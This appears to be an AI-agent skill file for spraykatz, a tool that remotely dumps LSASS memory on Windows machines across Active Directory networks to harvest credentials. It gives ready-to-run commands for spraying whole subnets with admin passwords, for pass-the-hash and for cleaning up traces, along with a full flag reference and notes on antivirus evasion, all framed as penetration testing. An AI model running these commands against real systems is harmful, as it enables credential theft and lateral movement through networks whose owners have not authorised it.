---
name: spraykatz
description: Retrieve credentials from Windows machines in Active Directory environments by remotely dumping LSASS process memory and parsing it. Use when performing lateral movement, credential harvesting, or internal penetration testing where administrative access to multiple targets is available.
---

# spraykatz

## Overview
Spraykatz is a tool designed to retrieve credentials from Windows machines and large Active Directory environments. It works by remotely executing `procdump` on target machines and parsing the resulting dumps to extract secrets while attempting to minimize detection by antivirus software. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume spraykatz is already installed. If you encounter a "command not found" error:

```bash
sudo apt update && sudo apt install spraykatz
```

Dependencies: nmap, python3, python3-impacket, python3-lxml, python3-openssl, python3-pyasn1, python3-pycryptodome, python3-pypykatz, python3-wget.

## Common Workflows

### Spraying a domain with a password
Retrieve credentials from a list of targets using a domain administrator or local admin account.
```bash
spraykatz -u Administrator -p 'P@ssword123!' -t 192.168.1.0/24 -d internal.corp
```

### Using an NTLM hash for authentication
Perform Pass-the-Hash to extract credentials from specific targets.
```bash
spraykatz -u AdminUser -p 00000000000000000000000000000000:aad3b435b51404eeaad3b435b51404ee -t 10.0.0.5,10.0.0.10 -d .
```

### Cleaning up remote artifacts
If a previous session was interrupted, use the remove flag to delete ProcDump and memory dumps from the targets.
```bash
spraykatz -u Administrator -p 'P@ssword123!' -t targets.txt -d internal.corp -r
```

### Targeting via file with high verbosity
```bash
spraykatz -u svc_backup -p 'BackupPass!' -t /path/to/targets.txt -d dev.local -v debug
```

## Complete Command Reference

```
usage: spraykatz.py [-h] -u USERNAME -p PASSWORD -t TARGETS [-d DOMAIN] [-r]
                    [-v {warning,info,debug}] [-w WAIT]
```

### Mandatory Arguments

| Flag | Description |
|------|-------------|
| `-u`, `--username <USER>` | User to spray with. Must have administrative rights on targeted systems for remote code execution. |
| `-p`, `--password <PASS>` | User's password or NTLM hash in the `LM:NT` format. |
| `-t`, `--targets <TARGETS>` | IP addresses, IP ranges, or a file path. Targets can be comma-separated inline or one per line in a file. |

### Optional Arguments

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show the help message and exit. |
| `-d`, `--domain <DOMAIN>` | User's domain. Use `-d .` for local accounts not part of a domain. |
| `-r`, `--remove` | Only try to remove ProcDump and dumps left behind on distant machines. |
| `-v`, `--verbosity <LEVEL>` | Set verbosity level: `warning`, `info`, or `debug`. (Default: `info`). |
| `-w`, `--wait <SECONDS>` | How many seconds to wait before exiting gracefully. (Default: `180`). |

## Notes
- **Safety Warning**: The documentation explicitly advises: "Do not use this on production environments!"
- The tool relies on administrative access (SMB/WMI) to the target machines to function.
- It attempts to bypass AV by parsing dumps remotely rather than running Mimikatz directly on the target.
- Ensure the `procdump` executable is available or that the tool can fetch its dependencies as required.